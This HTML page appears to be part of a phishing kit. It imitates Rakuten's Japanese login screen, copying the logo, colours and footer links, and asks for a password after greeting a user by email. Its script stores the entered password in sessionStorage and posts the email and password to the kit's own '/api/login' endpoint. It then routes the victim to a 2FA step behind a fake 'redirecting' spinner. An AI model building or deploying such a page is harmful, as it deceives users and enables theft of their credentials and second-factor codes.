<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ログイン - 楽天</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Helvetica Neue", Arial, "Hiragino Kaku Gothic ProN", "Hiragino Sans", Meiryo, sans-serif;
            background-color: #f4f5fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            position: relative;
            width: 500px;
            max-width: 90vw;
            background-color: #ffffff;
            box-shadow: 3px 3px 10px 5px rgba(0, 0, 0, 0.2);
            padding: 40px 50px;
            box-sizing: border-box;
        }

        .logo {
            margin-bottom: 40px;
            text-align: center;
        }

        .logo svg {
            height: 32px;
            width: auto;
        }

        .logo path {
            fill: #bf0000;
        }

        .welcome-text {
            font-size: 24px;
            font-weight: 400;
            color: #000;
            margin-bottom: 30px;
            letter-spacing: 0.02em;
            word-break: break-all;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 8px;
            font-weight: 400;
        }

        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 14px 12px;
            font-size: 16px;
            border: 2px solid #ccc;
            border-radius: 4px;
            transition: border-color 0.2s;
            background-color: #fff;
        }

        input[type="password"]:focus,
        input[type="text"]:focus {
            outline: none;
            border-color: #bf0000;
        }

        .show-password {
            display: flex;
            align-items: center;
            margin-top: 12px;
            cursor: pointer;
            user-select: none;
        }

        .show-password input[type="checkbox"] {
            width: 18px;
            height: 18px;
            margin-right: 8px;
            cursor: pointer;
            accent-color: #bf0000;
        }

        .show-password label {
            font-size: 14px;
            color: #333;
            margin: 0;
            cursor: pointer;
        }

        .next-button {
            width: 100%;
            padding: 16px;
            background-color: #bf0000;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 400;
            cursor: pointer;
            margin-top: 20px;
            margin-bottom: 20px;
            transition: background-color 0.2s;
        }

        .next-button:hover {
            background-color: #a00000;
        }

        .next-button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .forgot-password {
            display: block;
            color: #0066c0;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .forgot-password::after {
            content: '›';
            margin-left: 4px;
            font-size: 18px;
        }

        .other-account {
            display: block;
            color: #0066c0;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .other-account:hover {
            text-decoration: underline;
        }

        .other-account::after {
            content: '›';
            margin-left: 4px;
            font-size: 18px;
        }

        .language-selector {
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e0e0e0;
        }

        .language-selector button {
            background: none;
            border: none;
            color: #333;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 0;
        }

        .language-selector button:hover {
            color: #0066c0;
        }

        .language-icon {
            width: 20px;
            height: 20px;
        }

        .footer-links {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            font-size: 13px;
        }

        .footer-links a {
            color: #333;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .copyright {
            text-align: center;
            font-size: 13px;
            color: #666;
            padding-bottom: 20px;
        }

        .error-message {
            color: #bf0000;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }

        .loading-overlay {
            display: none;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            z-index: 100;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px;
        }

        .loading-overlay.show {
            display: flex;
        }

        .loading-logo {
            margin-bottom: 70px;
        }

        .loading-logo svg {
            height: 32px;
            width: auto;
        }

        .loading-logo path {
            fill: #bf0000;
        }

        .loading-text {
            font-size: 20px;
            font-weight: 300;
            color: #333;
            margin-bottom: 10px;
            letter-spacing: 0.05em;
        }

        .loading-subtext {
            font-size: 14px;
            font-weight: 300;
            color: #333;
            margin-bottom: 50px;
            letter-spacing: 0.02em;
        }

        .spinner {
            position: relative;
            width: 74px;
            height: 74px;
        }

        .spinner .bar {
            position: absolute;
            width: 6px;
            height: 20px;
            background-color: #999;
            border-radius: 3px;
            top: 0;
            left: 50%;
            margin-left: -3px;
            transform-origin: center 37px;
            opacity: 0;
            animation: fade 1.2s linear infinite;
        }

        .spinner .bar:nth-child(1) {
            transform: rotate(0deg);
            animation-delay: 0s;
        }

        .spinner .bar:nth-child(2) {
            transform: rotate(22.5deg);
            animation-delay: -1.125s;
        }

        .spinner .bar:nth-child(3) {
            transform: rotate(45deg);
            animation-delay: -1.05s;
        }

        .spinner .bar:nth-child(4) {
            transform: rotate(67.5deg);
            animation-delay: -0.975s;
        }

        .spinner .bar:nth-child(5) {
            transform: rotate(90deg);
            animation-delay: -0.9s;
        }

        .spinner .bar:nth-child(6) {
            transform: rotate(112.5deg);
            animation-delay: -0.825s;
        }

        .spinner .bar:nth-child(7) {
            transform: rotate(135deg);
            animation-delay: -0.75s;
        }

        .spinner .bar:nth-child(8) {
            transform: rotate(157.5deg);
            animation-delay: -0.675s;
        }

        .spinner .bar:nth-child(9) {
            transform: rotate(180deg);
            animation-delay: -0.6s;
        }

        .spinner .bar:nth-child(10) {
            transform: rotate(202.5deg);
            animation-delay: -0.525s;
        }

        .spinner .bar:nth-child(11) {
            transform: rotate(225deg);
            animation-delay: -0.45s;
        }

        .spinner .bar:nth-child(12) {
            transform: rotate(247.5deg);
            animation-delay: -0.375s;
        }

        .spinner .bar:nth-child(13) {
            transform: rotate(270deg);
            animation-delay: -0.3s;
        }

        .spinner .bar:nth-child(14) {
            transform: rotate(292.5deg);
            animation-delay: -0.225s;
        }

        .spinner .bar:nth-child(15) {
            transform: rotate(315deg);
            animation-delay: -0.15s;
        }

        .spinner .bar:nth-child(16) {
            transform: rotate(337.5deg);
            animation-delay: -0.075s;
        }

        @keyframes fade {
            0%, 100% {
                opacity: 1;
                background-color: #333;
            }
            50% {
                opacity: 0.3;
                background-color: #ddd;
            }
        }

        @media only screen and (max-width: 768px) {
            body {
                padding: 0;
                background-color: #ffffff;
            }

            .container {
                width: 100vw;
                max-width: 100vw;
                min-height: 100vh;
                box-shadow: none;
                padding: 30px 20px;
            }

            .welcome-text {
                font-size: 20px;
                margin-bottom: 25px;
            }

            .logo {
                margin-bottom: 30px;
            }

            input[type="password"],
            input[type="text"] {
                font-size: 16px;
                padding: 12px;
            }

            .next-button {
                padding: 14px;
                font-size: 15px;
            }

            .footer-links {
                flex-wrap: wrap;
                gap: 10px;
                justify-content: center;
            }

            .footer-links a {
                font-size: 12px;
            }

            .show-password label {
                font-size: 13px;
            }

            .loading-overlay {
                padding: 30px 20px;
            }

            .loading-logo {
                margin-bottom: 60px;
            }

            .loading-text {
                font-size: 18px;
                margin-bottom: 45px;
            }

            .spinner {
                width: 64px;
                height: 64px;
            }

            .spinner .bar {
                width: 5px;
                height: 17px;
                margin-left: -2.5px;
                transform-origin: center 32px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-overlay" id="loadingOverlay">
            <div class="loading-logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 166 50" height="32" width="106.24">
                    <path d="M41.2 49.4l92.3-8H33.2l8 8zm1.3-14.3v1.2h6.2V9.1h-6.2v1.2a10 10 0 0 0-5.8-1.9c-7 0-12.4 6.4-12.4 14.3S29.6 37 36.7 37c2.3 0 4-.7 5.8-1.9zM30.7 22.7c0-4.3 2.5-7.7 6-7.7s5.9 3.4 5.9 7.7c0 4.3-2.5 7.7-5.9 7.7-3.5 0-6-3.4-6-7.7zm56 14.3c3 0 5.3-1.7 5.3-1.7v1h6.2V9.1H92v16c0 3-2.1 5.5-5.1 5.5s-5.1-2.5-5.1-5.5v-16h-6.2v16c0 6.6 4.5 11.9 11.1 11.9zm68.2-28.6c-3 0-5.3 1.7-5.3 1.7v-1h-6.2v27.2h6.2v-16c0-3 2.1-5.5 5.1-5.5s5.1 2.5 5.1 5.5v16h6.2v-16c0-6.6-4.5-11.9-11.1-11.9zM22.4 14c0-6.5-5.3-11.7-11.7-11.7H0v34h6.5V25.8h4.6L19 36.3h8.1l-9.6-12.7c3-2.1 4.9-5.6 4.9-9.6zm-11.7 5.3H6.5V8.7h4.2c2.9 0 5.3 2.4 5.3 5.3s-2.4 5.3-5.3 5.3zm92.9 8c0 6.1 4.6 9.7 9.2 9.7a13 13 0 0 0 6-1.7l-4-5.4c-.6.4-1.3.7-2.1.7-1 0-2.9-.8-2.9-3.3V15.6h5.3V9.1h-5.3V2.3h-6.2v6.8h-3.3v6.5h3.3v11.7zm-45.1-2.2l9.2 11.2h8.6L64 21.8 74.6 9.1H66l-7.5 9.5V0h-6.3v36.3h6.3V25.1zm70.6-16.7c-7.2 0-12.3 6.3-12.3 14.3 0 8.4 6.4 14.3 12.9 14.3 3.3 0 7.4-1.1 10.9-6.1l-5.5-3.2c-4.2 6.2-11.3 3.1-12.1-3.2h17.8c1.7-9.7-4.7-16.1-11.7-16.1zm-5.7 10.8c1.3-6.4 9.9-6.8 11.1 0h-11.1z"></path>
                </svg>
            </div>
            <div class="loading-text">リダイレクト中です・・・</div>
            <div class="loading-subtext">最大20秒ほどかかる場合がこざいます</div>
            <div class="spinner">
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
                <div class="bar"></div>
            </div>
        </div>

        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 166 50" height="32" width="106.24">
                <path d="M41.2 49.4l92.3-8H33.2l8 8zm1.3-14.3v1.2h6.2V9.1h-6.2v1.2a10 10 0 0 0-5.8-1.9c-7 0-12.4 6.4-12.4 14.3S29.6 37 36.7 37c2.3 0 4-.7 5.8-1.9zM30.7 22.7c0-4.3 2.5-7.7 6-7.7s5.9 3.4 5.9 7.7c0 4.3-2.5 7.7-5.9 7.7-3.5 0-6-3.4-6-7.7zm56 14.3c3 0 5.3-1.7 5.3-1.7v1h6.2V9.1H92v16c0 3-2.1 5.5-5.1 5.5s-5.1-2.5-5.1-5.5v-16h-6.2v16c0 6.6 4.5 11.9 11.1 11.9zm68.2-28.6c-3 0-5.3 1.7-5.3 1.7v-1h-6.2v27.2h6.2v-16c0-3 2.1-5.5 5.1-5.5s5.1 2.5 5.1 5.5v16h6.2v-16c0-6.6-4.5-11.9-11.1-11.9zM22.4 14c0-6.5-5.3-11.7-11.7-11.7H0v34h6.5V25.8h4.6L19 36.3h8.1l-9.6-12.7c3-2.1 4.9-5.6 4.9-9.6zm-11.7 5.3H6.5V8.7h4.2c2.9 0 5.3 2.4 5.3 5.3s-2.4 5.3-5.3 5.3zm92.9 8c0 6.1 4.6 9.7 9.2 9.7a13 13 0 0 0 6-1.7l-4-5.4c-.6.4-1.3.7-2.1.7-1 0-2.9-.8-2.9-3.3V15.6h5.3V9.1h-5.3V2.3h-6.2v6.8h-3.3v6.5h3.3v11.7zm-45.1-2.2l9.2 11.2h8.6L64 21.8 74.6 9.1H66l-7.5 9.5V0h-6.3v36.3h6.3V25.1zm70.6-16.7c-7.2 0-12.3 6.3-12.3 14.3 0 8.4 6.4 14.3 12.9 14.3 3.3 0 7.4-1.1 10.9-6.1l-5.5-3.2c-4.2 6.2-11.3 3.1-12.1-3.2h17.8c1.7-9.7-4.7-16.1-11.7-16.1zm-5.7 10.8c1.3-6.4 9.9-6.8 11.1 0h-11.1z"></path>
            </svg>
        </div>

        <div class="welcome-text">ようこそ <span id="userEmail"></span></div>

        <form id="passwordForm">
            <div class="form-group">
                <label for="password">パスワード (必須)</label>
                <input type="password" id="password" name="password" required>
                <div class="error-message" id="errorMessage">パスワードを入力してください</div>
            </div>

            <div class="show-password">
                <input type="checkbox" id="showPassword">
                <label for="showPassword">パスワードを表示する</label>
            </div>

            <button type="submit" class="next-button">次へ</button>

            <a href="#" class="forgot-password">パスワードをお忘れの方</a>
            <a href="/login/email" class="other-account">別の楽天IDでログイン</a>

            <div class="language-selector">
                <button type="button">
                    <svg class="language-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
                        <path d="M2 12h20M12 2c2.5 2.5 4 6.5 4 10s-1.5 7.5-4 10M12 2C9.5 4.5 8 8.5 8 12s1.5 7.5 4 10" stroke="currentColor" stroke-width="2" fill="none"/>
                    </svg>
                    Language ›
                </button>
            </div>

            <div class="footer-links">
                <a href="https://ichiba.faq.rakuten.net/category/log-in-membership" target="_blank">ヘルプ</a>
                <a href="https://privacy.rakuten.co.jp/" target="_blank">個人情報保護方針</a>
                <a href="https://corp.rakuten.co.jp/terms/" target="_blank">会員規約</a>
            </div>

            <div class="copyright">
                © Rakuten
            </div>
        </form>
    </div>

    <script>
        window.addEventListener('DOMContentLoaded', function() {
            const userEmail = sessionStorage.getItem('userEmail');
            
            if (!userEmail) {
                window.location.href = '/login/email';
                return;
            }
            
            document.getElementById('userEmail').textContent = userEmail;
        });

        document.getElementById('showPassword').addEventListener('change', function() {
            const passwordInput = document.getElementById('password');
            passwordInput.type = this.checked ? 'text' : 'password';
        });

document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const passwordInput = document.getElementById('password');
            const password = passwordInput.value.trim();
            const errorMessage = document.getElementById('errorMessage');
            
            if (!password) {
                errorMessage.textContent = 'パスワードを入力してください';
                errorMessage.style.display = 'block';
                passwordInput.style.borderColor = '#bf0000';
                return;
            }
            
            const loadingOverlay = document.getElementById('loadingOverlay');
            loadingOverlay.classList.add('show');
            
            const userEmail = sessionStorage.getItem('userEmail');
            sessionStorage.setItem('userPassword', password);
            
            fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: userEmail,
                    password: password
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    if (data.requires_2fa) {
                        window.location.href = '/login/2fa';
                    } else {
                        window.location.href = data.redirect_url || '/dashboard/complete';
                    }
                } else {
                    loadingOverlay.classList.remove('show');
                    errorMessage.textContent = data.error || 'ユーザーID、メールアドレス又はパスワードが間違っています';
                    errorMessage.style.display = 'block';
                    passwordInput.style.borderColor = '#bf0000';
                }
            })
            .catch(error => {
                loadingOverlay.classList.remove('show');
                console.error('Error:', error);
                errorMessage.textContent = 'エラーが発生しました。もう一度お試しください。';
                errorMessage.style.display = 'block';
                passwordInput.style.borderColor = '#bf0000';
            });
        });
        
        document.getElementById('password').addEventListener('input', function() {
            document.getElementById('errorMessage').style.display = 'none';
            this.style.borderColor = '#ccc';
        });
    </script>
</body>
</html>